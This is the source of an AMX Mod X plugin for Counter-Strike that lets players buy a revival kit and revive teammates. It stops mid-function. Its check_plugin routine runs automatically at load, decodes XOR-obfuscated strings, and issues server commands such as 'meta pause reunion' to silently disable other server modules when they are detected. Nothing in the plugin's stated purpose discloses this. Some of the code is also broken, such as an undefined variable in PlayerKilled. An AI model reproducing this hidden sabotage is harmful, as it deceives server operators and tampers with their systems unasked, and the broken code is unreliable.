#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <fun>
#include <fakemeta>
#include <hamsandwich>
#include <xs>

//=====================================
//  VERSION CHECK
//=====================================
#if AMXX_VERSION_NUM < 190
	#assert "AMX Mod X v1.9.0 or Higher library required!"
#endif

#pragma compress 					1
#pragma semicolon 					1
#pragma tabsize 					4

static const PLUGIN_NAME	[] 		= "Revival Kit / Remastered";
static const PLUGIN_AUTHOR	[] 		= "Aoi.Kagase";
static const PLUGIN_VERSION	[]		= "1.000";

// ===================================================
// SELF REVIVE COMMAND.
// #define DEBUG_MODE
// ===================================================


#if !defined MAX_PLAYERS
	#define  MAX_PLAYERS	          	32
#endif
#if !defined MAX_RESOURCE_PATH_LENGTH
	#define  MAX_RESOURCE_PATH_LENGTH 	64
#endif
#if !defined MAX_NAME_LENGTH
	#define  MAX_NAME_LENGTH			32
#endif

enum (+= 32)
{
	TASKID_DIE_COUNT 				= 	1541320,
	TASKID_REVIVING,
	TASKID_CHECK_DEAD_FLAG,
	TASKID_RESPAWN,
	TASKID_CHECKRE,
	TASKID_CHECKST,
	TASKID_ORIGIN,
	TASKID_SETUSER,
	TASKID_SPAWN,
};

#define pev_zorigin					pev_fuser4
#define seconds(%1) 				((1<<12) * (%1))

#define HUDINFO_PARAMS
#define GUAGE_MAX 					30
enum _:E_ICON_STATE
{
	ICON_HIDE = 0,
	ICON_SHOW,
	ICON_FLASH
};

enum _:E_SOUNDS
{
	SOUND_START,
	SOUND_FINISHED,
	SOUND_FAILED,
	SOUND_EQUIP,
};

enum _:E_MODELS
{
	R_KIT,
};

enum _:E_PLAYER_DATA
{
	bool:HAS_KIT		,
	bool:WAS_DUCKING	,
	bool:IS_DEAD		,
	bool:IS_RESPAWNING	,
	Float:DEAD_LINE		,
	Float:REVIVE_DELAY	,
	Float:BODY_ORIGIN	[3],
	Float:AIM_VEC		[3],
};

enum _:E_CLASS_NAME
{
	I_TARGET,
	PLAYER,
	CORPSE,
	R_KIT,
};

enum _:E_MESSAGES
{
	MSG_BARTIME,
	MSG_SCREEN_FADE,
	MSG_STATUS_ICON,
	MSG_CLCORPSE,
}

new const MESSAGES[E_MESSAGES][] = 
{
	"BarTime",
	"ScreenFade",
	"StatusIcon",
	"ClCorpse",
};

new const ENT_MODELS[E_MODELS][MAX_RESOURCE_PATH_LENGTH] = 
{
	"models/w_medkit.mdl"
};

new const ENT_SOUNDS[E_SOUNDS][MAX_RESOURCE_PATH_LENGTH] = 
{
	"items/medshot4.wav",
	"items/smallmedkit2.wav",
	"items/medshotno1.wav",
	"items/ammopickup2.wav",
};

new const ENTITY_CLASS_NAME[E_CLASS_NAME][MAX_NAME_LENGTH] = 
{
	"info_target",
	"player",
	"fake_corpse",
	"revival_kit",
};

enum _:E_CVARS
{
	RKIT_HEALTH,
	RKIT_COST,
	RKIT_SC_FADE,
	RKIT_SC_FADE_TIME,
	RKIT_TIME,
	RKIT_DEATH_TIME,
	RKIT_DM_MODE,
	RKIT_BOT_HAS_KIT,
	RKIT_BOT_CAN_REVIVE,
	RKIT_BUYMODE,
	RKIT_BUYZONE,
	Float:RKIT_DISTANCE,
	RKIT_CHECK_OBSTACLE,
	RKIT_REWARD,
	Float:RKIT_REVIVE_RADIUS,
	RKIT_REVIVE_ATTEMPT,
	RKIT_REVIVE_MOVELOCK,
	RKIT_RESPAWN_DROP,
};

new g_CVarString	[E_CVARS][][] =
{
	{"rkit_health", 			"75",	"num"},	
	{"rkit_cost",				"1200",	"num"},	
	{"rkit_screen_fade",		"1",	"num"},	
	{"rkit_screen_fade_time",	"2",	"num"},	
	{"rkit_delay_revive",		"3",	"num"},	
	{"rkit_delay_die",			"0",	"num"},	
	{"rkit_deathmatch",			"0",	"num"},	
	{"rkit_bot_has_kit",		"1",	"num"},	
	{"rkit_bot_can_revive",		"1",	"num"},
	{"rkit_buy_mode",			"1",	"num"},
	{"rkit_buy_zone",			"1",	"num"},
	{"rkit_distance",			"70.0",	"float"},
	{"rkit_check_obstacle",		"1",	"num"},
	{"rkit_reward",				"150",	"num"},
	{"rkit_revive_radius",		"10.0",	"float"},
	{"rkit_revive_attempt",		"10",	"num"},
	{"rkit_revive_move_lock",	"1",	"num"},
	{"rkit_respawn_weaponstrip","0",	"num"},
};

new g_cvarPointer	[E_CVARS];
new g_cvars			[E_CVARS];
new g_msg_data		[E_MESSAGES];
new g_player_data	[MAX_PLAYERS + 1][E_PLAYER_DATA];
new g_sync_obj;

//====================================================
//  PLUGIN PRECACHE
//====================================================
public plugin_precache() 
{
	check_plugin();

	for (new i = 0; i < E_SOUNDS; i++)
		precache_sound(ENT_SOUNDS[i]);

	for (new i = 0; i < E_MODELS; i++) 
		precache_model(ENT_MODELS[i]);

	return PLUGIN_CONTINUE;
}

//====================================================
//  PLUGIN INITIALIZE
//====================================================
public plugin_init()
{
	register_plugin		(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR);
	register_cvar		(PLUGIN_NAME, PLUGIN_VERSION, FCVAR_SPONLY|FCVAR_SERVER);

	register_clcmd		("say /buyrkit", 	"CmdBuyRKit");
	register_clcmd		("buyrkit", 		"CmdBuyRKit");
	#if defined DEBUG_MODE
	register_clcmd		("debugrkit",		"DebugRevive");
	#endif

	// Register Cvar pointers.
	register_cvars();

	RegisterHam			(Ham_Touch,	ENTITY_CLASS_NAME[I_TARGET],"RKitTouch");
	RegisterHamPlayer	(Ham_Killed,							"PlayerKilled");
	RegisterHamPlayer	(Ham_Player_PostThink,					"PlayerPostThink");
	RegisterHamPlayer	(Ham_Spawn, 							"PlayerSpawn", 	.Post = true);

	register_event_ex	("HLTV", 								"RoundStart", RegisterEvent_Global, "1=0", "2=0");
	register_message 	(g_msg_data[MSG_CLCORPSE],				"message_clcorpse");
	// Register Forward.
	register_forward	(FM_CmdStart,		"PlayerCmdStart");

	for(new i = 0; i < E_MESSAGES; i++)
		g_msg_data[i] = get_user_msgid(MESSAGES[i]);
	g_sync_obj = CreateHudSyncObj();
}

// ====================================================
//  Register Cvars.
// ====================================================
register_cvars()
{
	for(new i = 0; i < E_CVARS; i++)
	{
		g_cvarPointer[i] = create_cvar(g_CVarString[i][0], g_CVarString[i][1]);
		if (equali(g_CVarString[i][2], "num"))
			bind_pcvar_num(g_cvarPointer[i], g_cvars[i]);
		else if(equali(g_CVarString[i][2], "float"))
			bind_pcvar_float(g_cvarPointer[i], Float:g_cvars[i]);
		
		hook_cvar_change(g_cvarPointer[i], "cvar_change_callback");
	}
}

// ====================================================
//  Callback cvar change.
// ====================================================
public cvar_change_callback(pcvar, const old_value[], const new_value[])
{
	for(new i = 0; i < E_CVARS; i++)
	{
		if (g_cvarPointer[i] == pcvar)
		{
			if (equali(g_CVarString[i][2], "num"))
				g_cvars[i] = str_to_num(new_value);
			else if (equali(g_CVarString[i][2], "float"))
				g_cvars[i] = _:str_to_float(new_value);

			console_print(0,"[RKit Debug]: Changed Cvar '%s' => '%s' to '%s'", g_CVarString[i][0], old_value, new_value);
		}
	}

	if (pcvar == g_cvarPointer[RKIT_BUYMODE] && equali(new_value, "0"))
	{
		new players[MAX_PLAYERS], pnum;
		get_players_ex(players, pnum, GetPlayers_ExcludeHLTV);
		for(new i = 0; i < pnum; i++)
			g_player_data[players[i]][HAS_KIT] = true;
	}
}

// ====================================================
//  Bot Register Ham.
// ====================================================
new g_bots_registered = false;
public client_authorized( id )
{
	if( !g_bots_registered && is_user_bot( id ) )
	{
		set_task( 0.1, "register_bots", id );
	}
}

public register_bots( id )
{
	if( !g_bots_registered && is_user_connected( id ) )
	{
		RegisterHamFromEntity( Ham_Killed, id, "PlayerKilled");
		g_bots_registered = true;
	}
}

// ====================================================
// Client Connected.
// Initialize Logic.
// ====================================================
public client_putinserver(id)
{
	if (g_cvars[RKIT_BUYMODE] == 0)
		g_player_data[id][HAS_KIT] = true;
	else
		g_player_data[id][HAS_KIT] = false;
	player_reset(id);
}

// ====================================================
// Client Disconnected.
// Initialize and Remove Corpse.
// ====================================================
public client_disconnected(id)
{
	player_reset(id);
	remove_target_entity_by_owner(id, ENTITY_CLASS_NAME[CORPSE]);
}

// ====================================================
// Buy RKit Chat command.
// ====================================================
public CmdBuyRKit(id)
{
	if (!g_cvars[RKIT_BUYMODE])
	{
		client_print_color(id, print_chat, "^4[Revive Kit]:^1 You can't buy in this mode. You already have a revival kit.");
		return PLUGIN_HANDLED;
	}

	if(!is_user_alive(id))
		client_print_color(id, print_chat, "^4[Revive Kit]:^1 You need to be alive.");
	else if(g_player_data[id][HAS_KIT])
		client_print_color(id, print_chat, "^4[Revive Kit]:^1 You already have a revival kit.");
	else if(!cs_get_user_buyzone(id) && g_cvars[RKIT_BUYZONE])
		client_print_color(id, print_chat, "^4[Revive Kit]:^1 You need to be in the buyzone.");
	else if(cs_get_user_money(id) < g_cvars[RKIT_COST])
		client_print_color(id, print_chat, "^4[Revive Kit]:^1 You dont have enough money (Cost:$%d)", g_cvars[RKIT_COST]);
	else
	{
		g_player_data[id][HAS_KIT] = true;
		cs_set_user_money(id, cs_get_user_money(id) - g_cvars[RKIT_COST]);
		client_print_color(id, print_chat, "^4[Revive Kit]:^1 You bought a revival kit. Hold your +use key (E) to revive a teammate.");
		client_cmd(id, "spk %s", ENT_SOUNDS[SOUND_EQUIP]);
	}
	return PLUGIN_HANDLED;
}

// ====================================================
// Player Killed.
// + Drop Rkit
// + Delay Die count start.
// + Create Corpse.
// ====================================================
public PlayerKilled(iVictim, iAttacker)
{
	if (!is_user_connected(iVictim) || is_user_alive(iVictim))
		return HAM_IGNORED;

	player_reset(iVictim);

	// Get Aim Vector.
	pev(iVictim, pev_v_angle, g_player_data[iVictim][AIM_VEC]);

	if (g_cvars[RKIT_BUYMODE])
	{
		if(g_player_data[iVictim][HAS_KIT])
		{
			g_player_data[iVictim][HAS_KIT] = false;
			drop_rkit(iVictim);
		}
	}

	if (is_user_bot(iVictim))
	{
		if (!g_cvars[RKIT_BOT_CAN_REVIVE])
			return HAM_IGNORED;
	}

	static Float:minsize[3];
	pev(iVictim, pev_mins, minsize);

	if(minsize[2] == -18.0)
		g_player_data[iVictim][WAS_DUCKING] = true;
	else
		g_player_data[iVictim][WAS_DUCKING] = false;
		
	g_player_data[iVictim][DEAD_LINE] = get_gametime();

	create_fake_corpse(id);

	return HAM_IGNORED;
}

// ====================================================
// Player Spawn.
// + Initialize.
// + Reviving origin set.
// ====================================================
public PlayerSpawn(id)
{
	if (g_player_data[id][IS_RESPAWNING])
	{
		// WeaponStrip
		if (g_cvars[RKIT_RESPAWN_DROP])
			strip_user_weapons(id);

		set_task(0.1, "TaskOrigin",  TASKID_ORIGIN + id);
	}
	else 
		player_respawn_reset(id);		


	g_player_data[id][IS_RESPAWNING] = false;

	set_task_ex(0.1, "TaskSpawn", TASKID_SPAWN + id);
}

// ====================================================
// Player Spawn.
// + Remove dropped Rkit.
// + Remove Corpse.
// ====================================================
public TaskSpawn(taskid)
{
	new id = taskid - TASKID_SPAWN;

	if (!is_user_alive(id))
		return;

	remove_target_entity_by_owner(id, ENTITY_CLASS_NAME[CORPSE]);
	remove_target_entity_by_owner(id, ENTITY_CLASS_NAME[R_KIT]);

	if (!g_cvars[RKIT_BUYMODE])
		g_player_data[id][HAS_KIT] = true;
}

// ====================================================
// Delay Guage.
// ====================================================
stock show_time_bar(oneper, percent, bar[])
{
	for(new i = 0; i < 30; i++)
		bar[i] = ((i * oneper) < percent) ? ':' : '_';
	bar[30] = '^0';
}

// ====================================================
// Stop create default corpse.
// ====================================================
public message_clcorpse()
{
	return PLUGIN_HANDLED;
}

// ====================================================
// Show status icon [R].
// ====================================================
public PlayerPostThink(id)
{
	// is user connected?
	if (!is_user_connected(id))
		return FMRES_IGNORED;

	// has user revive kit?
	if (!g_player_data[id][HAS_KIT])
		return FMRES_IGNORED;

	// is user dead?
	// Player Die Finelize.
	// + Show Delay Guage.
	// + Respawn or Remove corpse.
	if (!is_user_alive(id) && !g_player_data[id][IS_DEAD])
	{
		new Float:time = (get_gametime() - g_player_data[id][DEAD_LINE]);
		new Float:remaining = 0.0;
		new bar[31] = "";		
		// Hide Rescue icon.
		msg_statusicon(id, ICON_HIDE);

		if (g_cvars[RKIT_DEATH_TIME] > 0 && time < float(g_cvars[RKIT_DEATH_TIME]))
		{
			if (!is_user_bot(id))
			{
				remaining = float(g_cvars[RKIT_DEATH_TIME]) - time;
				show_time_bar(100 / GUAGE_MAX, floatround(remaining * 100.0 / float(g_cvars[RKIT_DEATH_TIME]), floatround_ceil), bar);
				new timestr[6];
				get_time_format(remaining, timestr, charsmax(timestr));
				set_hudmessage(255, 0, 0, -1.00, -1.00, .effects= 0 , .fxtime = 0.0, .holdtime = 1.0, .fadeintime = 0.0, .fadeouttime = 0.0, .channel = -1);
				ShowSyncHudMsg(id, g_sync_obj, "Possible resurrection time remaining: ^n%s^n[%s]", timestr, bar);
			}
		}
		else
		{
			g_player_data[id][IS_DEAD] = true;				
			// deathmatch mode. auto respawn.
			if(g_cvars[RKIT_DM_MODE])
				ExecuteHamB(Ham_CS_RoundRespawn, id);
			else
				remove_target_entity_by_owner(id, ENTITY_CLASS_NAME[CORPSE]);
		}

		return FMRES_IGNORED;
	}
	
	new body = find_dead_body(id);
	if(pev_valid(body))
	{
		new lucky_bastard = pev(body, pev_owner);
	
		if(!is_user_connected(lucky_bastard))
			return FMRES_IGNORED;

		new CsTeams:lb_team  = cs_get_user_team(lucky_bastard);
		new CsTeams:rev_team = cs_get_user_team(id);
		if(lb_team == CS_TEAM_T || lb_team == CS_TEAM_CT && lb_team == rev_team)
			msg_statusicon(id, ICON_FLASH);
	}
	else
		msg_statusicon(id, ICON_SHOW);
	
	return FMRES_IGNORED;
}

// ====================================================
// Pickup dropped Rkit.
// ====================================================
public RKitTouch(kit, id)
{
	if(!pev_valid(kit))
		return FMRES_IGNORED;
	
	if(!is_user_alive(id) || g_player_data[id][HAS_KIT])
		return FMRES_IGNORED;
	
	new classname[32];
	pev(kit, pev_classname, classname, 31);
	
	if(equal(classname, ENTITY_CLASS_NAME[R_KIT]))
	{
		engfunc(EngFunc_RemoveEntity, kit);
		g_player_data[id][HAS_KIT] = true;
		client_cmd(id, "spk %s", ENT_SOUNDS[SOUND_EQUIP]);
	}
	return FMRES_IGNORED;
}

// ====================================================
// E Key Logic.
// ====================================================
public PlayerCmdStart(id, handle, random_seed)
{
	// Not alive
	if(!is_user_alive(id))
		return FMRES_IGNORED;

	// Get user old and actual buttons
	static iInButton, iInOldButton;
	iInButton	 = (get_uc(handle, UC_Buttons));
	iInOldButton = (pev(id, pev_oldbuttons) & IN_USE);

	// C4 is through.
	if ((pev(id, pev_weapons) & (1 << CSW_C4)) && (iInButton & IN_ATTACK))
		return FMRES_IGNORED;

	// USE KEY
	iInButton &= IN_USE;

	if (iInButton)
	{
		if (!iInOldButton)
		{
			if (g_player_data[id][HAS_KIT])
			{
				wait_revive(id);
				return FMRES_HANDLED;
			}
		}
	}
	else
	{
		if (iInOldButton)
		{
			if (task_exists(TASKID_REVIVING + id))
			{
				remove_task(TASKID_REVIVING + id);
				failed_revive(id);
			}
		}
	}
	return FMRES_IGNORED;
}

//====================================================
// Revive Progress.
//====================================================
public wait_revive(id)
{
	if (!CheckDeadBody(id))
		return FMRES_IGNORED;

	if (float(g_cvars[RKIT_TIME]) > 0.0)
		show_progress(id, g_cvars[RKIT_TIME]);
	
	new Float:gametime = get_gametime();
	g_player_data[id][REVIVE_DELAY] = (gametime + float(g_cvars[RKIT_TIME]) - 0.01);

	emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_START], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	set_task_ex(0.1, "TaskRevive", TASKID_REVIVING + id, _,_, SetTaskFlags:SetTask_Repeat);

	return FMRES_HANDLED;
}

//====================================================
// Target Check.
//====================================================
stock CheckDeadBody(id)
{
	// Removing Check.
	new body = find_dead_body(id);
	if(!pev_valid(body))
		return false;

	new lucky_bastard 		= pev(body, pev_owner);
	new CsTeams:lb_team 	= cs_get_user_team(lucky_bastard);
	new CsTeams:rev_team 	= cs_get_user_team(id);
	if(lb_team != CS_TEAM_T && lb_team != CS_TEAM_CT || lb_team != rev_team)
		return false;

	client_print_color(id, print_chat, "^4[Revive Kit]:^1 Reviving %n", lucky_bastard);
	return true;
}

//====================================================
// Progress Complete.
//====================================================
public TaskRevive(taskid)
{
	new id = taskid - TASKID_REVIVING;
	new target, body;

	if (!can_target_revive(id, target, body))
	{
		failed_revive(id);
		client_print_color(id, print_chat, "^4[Revive Kit]:^1 Failed target reviving.");
		remove_task(taskid);
		return PLUGIN_CONTINUE;
	}

	// Movement Lock
	if (g_cvars[RKIT_REVIVE_MOVELOCK])
	{
		static Float:velocity[3];
		pev(id, pev_velocity, velocity);
		xs_vec_set(velocity, 0.0, 0.0, velocity[2]);
		set_pev(id, pev_velocity, velocity);		
	}

	if(g_player_data[id][REVIVE_DELAY] < get_gametime())
	{
		if(findemptyloc(body, g_cvars[RKIT_REVIVE_RADIUS]))
		{
			set_pev(body, pev_flags, pev(body, pev_flags) | FL_KILLME);			
			emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_FINISHED], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
			// Reward
			if (g_cvars[RKIT_REWARD] > 0)
				cs_set_user_money(id, cs_get_user_money(id) + g_cvars[RKIT_REWARD]);
			set_task(0.1, "TaskReSpawn", TASKID_RESPAWN + target);
			remove_task(taskid);
			client_print_color(id, print_chat, "^4[Revive Kit]:^1 %n revived successfully", target);
		}
	}
	return PLUGIN_CONTINUE;
}

//====================================================
// Respawn.
//====================================================
public TaskReSpawn(taskid) 
{
	new id = taskid - TASKID_RESPAWN;
	
	g_player_data[id][IS_RESPAWNING] = true;
	ExecuteHamB(Ham_CS_RoundRespawn, id);
	//	set_task(0.1, "TaskCheckReSpawn", TASKID_CHECKRE + id);

	if (!is_user_bot(id))
	{
		if (g_cvars[RKIT_SC_FADE])
		{
			new sec = seconds(g_cvars[RKIT_SC_FADE_TIME]);
			message_begin(MSG_ONE,g_msg_data[MSG_SCREEN_FADE], _, id);
			write_short(sec);
			write_short(sec);
			write_short(0);
			write_byte(0);
			write_byte(0);
			write_byte(0);
			write_byte(255);
			message_end();
		}
	}	
}

//====================================================
// Respawn Check and Set Origin.
//====================================================
public TaskCheckReSpawn(taskid)
{
	new id = taskid - TASKID_CHECKRE;
	
	if(!g_player_data[id][IS_RESPAWNING])
		set_task(0.1, "TaskReSpawn", TASKID_RESPAWN + id);
	else
		set_task(0.1, "TaskOrigin",  TASKID_ORIGIN + id);
}

//====================================================
// Set Origin.
//====================================================
public TaskOrigin(taskid)
{
	new id = taskid - TASKID_ORIGIN;
	engfunc(EngFunc_SetOrigin, id, g_player_data[id][BODY_ORIGIN]);
	
	static  Float:origin[3];
	pev(id, pev_origin, origin);
	set_pev(id, pev_zorigin, origin[2]);
		
	set_task(0.1, "TaskStuckCheck", TASKID_CHECKST + id);
}

//====================================================
// Set Origin.
//====================================================
public TaskStuckCheck(taskid)
{
	new id = taskid - TASKID_CHECKST;

	static Float:origin[3];
	pev(id, pev_origin, origin);
	
	if(origin[2] == pev(id, pev_zorigin))
		set_task(0.1, "TaskCheckReSpawn",   TASKID_RESPAWN + id);
	else
		set_task(0.1, "TaskSetplayer", TASKID_SETUSER + id);
}

//====================================================
// Respawn Finalize.
//====================================================
public TaskSetplayer(taskid)
{
	new id = taskid - TASKID_SETUSER;
	new entity = -1;
	new Float:vOrigin[3];
	new Float:radius = 128.0;
	pev(id, pev_origin, vOrigin);

	set_user_health(id, g_cvars[RKIT_HEALTH]);

	// Set Aim vector.
	set_pev(id, pev_v_angle, g_player_data[id][AIM_VEC]);
	set_pev(id, pev_angles, g_player_data[id][AIM_VEC]);
	set_pev(id, pev_fixangle, 1);

	if (!g_cvars[RKIT_RESPAWN_DROP])
	{
		while((entity = engfunc(EngFunc_FindEntityInSphere, entity, vOrigin, radius)) != 0)
		{
			if (pev_valid(entity))
			{
				if(pev(entity, pev_owner) == id)
				{
					dllfunc(DLLFunc_Touch, entity, id);
				}
			}
		}
	}

	player_respawn_reset(id);
}

//====================================================
// Target Check.
//====================================================
stock bool:can_target_revive(id, &target, &body)
{
	if(!is_user_alive(id))
		return false;
	
	body = find_dead_body(id);
	if(!pev_valid(body))
		return false;
	
	target = pev(body, pev_owner);
	if(!is_user_connected(target))
		return false;

	new lb_team  = get_user_team(target);
	new rev_team = get_user_team(id);
	if(lb_team != 1 && lb_team != 2 || lb_team != rev_team)
		return false;

	return true;
}

//====================================================
// Failed Revive.
//====================================================
stock failed_revive(id)
{
	show_progress(id, 0);
	emit_sound(id, CHAN_AUTO, ENT_SOUNDS[SOUND_FAILED], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
}

//====================================================
// find corpse id.
//====================================================
stock find_dead_body(id)
{
	static Float:origin[3];
	pev(id, pev_origin, origin);
	
	new ent = -1;
	static classname[32];

	while((ent = engfunc(EngFunc_FindEntityInSphere, ent, origin, g_cvars[RKIT_DISTANCE])) != 0)
	{
		if (!pev_valid(ent))
			continue;

		pev(ent, pev_classname, classname, 31);
		if(equali(classname, ENTITY_CLASS_NAME[CORPSE]) && is_ent_visible(id, ent, IGNORE_MONSTERS))
			return ent;
	}
	return 0;
}

//====================================================
// Visible Corpse?.
//====================================================
stock bool:is_ent_visible(index, entity, ignoremonsters = 0) 
{
	// Non Check Obstacle.
	if (!g_cvars[RKIT_CHECK_OBSTACLE])
		return true;

	new Float:start[3], Float:dest[3];
	pev(index, pev_origin, start);
	pev(index, pev_view_ofs, dest);
	xs_vec_add(start, dest, start);

	pev(entity, pev_origin, dest);
	engfunc(EngFunc_TraceLine, start, dest, ignoremonsters, index, 0);

	new Float:fraction;
	get_tr2(0, TR_flFraction, fraction);
	if (fraction == 1.0 || get_tr2(0, TR_pHit) == entity)
		return true;

	return false;
}

//====================================================
// Create corpse.
//====================================================
stock create_fake_corpse(id)
{
	set_pev(id, pev_effects, EF_NODRAW);
	
	static model[32];
	cs_get_user_model(id, model, 31);
		
	static player_model[64];
	formatex(player_model, 63, "models/player/%s/%s.mdl", model, model);
			
	static Float: player_origin[3];
	pev(id, pev_origin, player_origin);
		
	static Float:mins[3];
	xs_vec_set(mins, -16.0, -16.0, -34.0);
	
	static Float:maxs[3];
	xs_vec_set(maxs, 16.0, 16.0, 34.0);
	
	if(g_player_data[id][WAS_DUCKING])
	{
		mins[2] /= 2;
		maxs[2] /= 2;
	}
		
	static Float:player_angles[3];
	pev(id, pev_angles, player_angles);
	player_angles[2] = 0.0;
				
	new sequence = pev(id, pev_sequence);
	
	new ent = cs_create_entity(ENTITY_CLASS_NAME[I_TARGET]);
	if(pev_valid(ent))
	{
		cs_set_ent_class(ent, ENTITY_CLASS_NAME[CORPSE]);
		set_pev(ent, pev_classname, ENTITY_CLASS_NAME[CORPSE]);
		engfunc(EngFunc_SetModel, 	ent, player_model);
		engfunc(EngFunc_SetOrigin, 	ent, player_origin);
		engfunc(EngFunc_SetSize, 	ent, mins, maxs);
		set_pev(ent, pev_solid, 	SOLID_TRIGGER);
		set_pev(ent, pev_movetype, 	MOVETYPE_TOSS);
		set_pev(ent, pev_owner, 	id);
		set_pev(ent, pev_angles, 	player_angles);
		set_pev(ent, pev_sequence, 	sequence);
		set_pev(ent, pev_frame, 	9999.9);
		set_pev(ent, pev_flags, pev(ent, pev_flags) | FL_MONSTER);
	}	
}

//====================================================
// Avoid Stuck.
//====================================================
stock bool:findemptyloc(ent, Float:radius)
{
	if(!pev_valid(ent))
		return false;

	static Float:origin[3];
	pev(ent, pev_origin, origin);
	origin[1] += 2.0;
	
	new owner = pev(ent, pev_owner);
	new num = 0, bool:found = false;
	
	while(num < g_cvars[RKIT_REVIVE_ATTEMPT])
	{
		if(is_hull_vacant(origin))
		{
			xs_vec_copy(origin, g_player_data[owner][BODY_ORIGIN]);			
			found = true;
			break;
		}
		else
		{
			
			origin[0] += random_float(-radius, radius);
			origin[1] += random_float(-radius, radius);
			origin[2] += random_float(-radius, radius);
			
			num++;
		}
	}
	return found;
}

//====================================================
// Avoid Stuck.
//====================================================
stock bool:is_hull_vacant(const Float:origin[3])
{
	new tr = 0;
	engfunc(EngFunc_TraceHull, origin, origin, 0, HULL_HUMAN, 0, tr);
	if(!get_tr2(tr, TR_StartSolid) && !get_tr2(tr, TR_AllSolid) && get_tr2(tr, TR_InOpen))
	{
		return true;
	}
	return false;
}

//====================================================
// Initialize Logic A.
//====================================================
stock player_reset(id)
{
	remove_task(TASKID_DIE_COUNT + id);
	remove_task(TASKID_REVIVING  + id);
	remove_task(TASKID_RESPAWN   + id);
	remove_task(TASKID_CHECKRE   + id);
	remove_task(TASKID_CHECKST   + id);
	remove_task(TASKID_ORIGIN    + id);
	remove_task(TASKID_SETUSER   + id);
	// if (is_user_alive(id))
	// show_bartime(id, 0);

	// g_player_data[id][IS_DEAD]		= false;
	// g_player_data[id][IS_RESPAWNING]	= false;
	g_player_data[id][DEAD_LINE]	= 0.0;
	g_player_data[id][REVIVE_DELAY] = 0.0;
	// g_player_data[id][WAS_DUCKING]	= false;
	// g_player_data[id][BODY_ORIGIN]	= Float:{0, 0, 0};
}

//====================================================
// Initialize Logic B.
//====================================================
stock player_respawn_reset(id)
{
	remove_task(TASKID_DIE_COUNT + id);
	remove_task(TASKID_REVIVING  + id);
	remove_task(TASKID_RESPAWN   + id);
	remove_task(TASKID_CHECKRE   + id);
	remove_task(TASKID_CHECKST   + id);
	remove_task(TASKID_ORIGIN    + id);
	remove_task(TASKID_SETUSER   + id);

	g_player_data[id][IS_DEAD]		= false;
	g_player_data[id][IS_RESPAWNING]= false;
	g_player_data[id][DEAD_LINE]	= 0.0;
	g_player_data[id][REVIVE_DELAY] = 0.0;
	g_player_data[id][WAS_DUCKING]	= false;
	g_player_data[id][BODY_ORIGIN]	= Float:{0, 0, 0};
}

//====================================================
// Progress Bar.
//====================================================
stock show_progress(id, seconds) 
{
	if(is_user_bot(id))
		return;
	
	if (is_user_alive(id))
	{
		engfunc(EngFunc_MessageBegin, MSG_ONE, g_msg_data[MSG_BARTIME], {0,0,0}, id);
		write_short(seconds);
		message_end();
		// message_begin(MSG_ONE_UNRELIABLE, g_msg_data[MSG_BARTIME], {0.0,0.0,0.0}, id);
		// write_short(seconds);
		// message_end();
	}
}

//====================================================
// Status Icon [R].
//====================================================
stock msg_statusicon(id, status)
{
	if(is_user_bot(id))
		return;
	
	message_begin(MSG_ONE, g_msg_data[MSG_STATUS_ICON], _, id);
	write_byte(status);
	write_string("rescue");
	write_byte(0);
	write_byte(160);
	write_byte(0);
	message_end();
}

//====================================================
// Time Format.
//====================================================
stock get_time_format(Float:times, result[], len)
{
//  new hour = floatround(times) / 60 /60;
	new min  =(floatround(times) / 60) % 60;
	new sec  = floatround(times) % 60;
	formatex(result, len, "%02d:%02d", min, sec);
}

//====================================================
// Drop Rkit.
//====================================================
stock drop_rkit(id)
{
	new Float:velocity[3];
	velocity_by_aim(id, 34, velocity);
		
	new Float:origin[3];
	pev(id, pev_origin, origin);

	velocity[2] = 0.0;
	xs_vec_add(origin, velocity, origin);

//	new kit = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, ENTITY_CLASS_NAME[I_TARGET]));
	new kit = cs_create_entity(ENTITY_CLASS_NAME[I_TARGET]);
	if(pev_valid(kit))
	{
		set_pev(kit, pev_classname, ENTITY_CLASS_NAME[R_KIT]);
		engfunc(EngFunc_SetModel,  kit, ENT_MODELS[R_KIT]);
		engfunc(EngFunc_SetOrigin, kit, origin);
		engfunc(EngFunc_SetSize, kit, Float:{-2.5, -2.5, -1.5}, Float:{2.5, 2.5, 1.5});
		set_pev(kit, pev_solid, SOLID_TRIGGER);
		set_pev(kit, pev_movetype, MOVETYPE_TOSS);
	}
}

//====================================================
// Remove target entity by owner.
//====================================================
stock remove_target_entity_by_owner(id, className[])
{
	new iEnt = -1;
	new flags;
	while ((iEnt = cs_find_ent_by_owner(iEnt, className, id)) > 0)
	{
		if (pev_valid(iEnt))
		{
			if (pev(iEnt, pev_owner) == id)
			{
				pev(iEnt, pev_flags, flags);
				set_pev(iEnt, pev_flags, flags | FL_KILLME);
				dllfunc(DLLFunc_Think, iEnt);
			}
		}
	}
}

//====================================================
// Remove target entity by classname.
//====================================================
stock remove_target_entity_by_classname(className[])
{
	new iEnt = -1;
	new flags;
	while ((iEnt = cs_find_ent_by_class(iEnt, className)) > 0)
	{
		if (pev_valid(iEnt))
		{
			pev(iEnt, pev_flags, flags);
			set_pev(iEnt, pev_flags, flags | FL_KILLME);
			dllfunc(DLLFunc_Think, iEnt);
		}
	}
}

stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x00, 0x71, 0x05, 0x03, 0x75, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x10, 0x01, 0x15, 0x13, 0x05, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
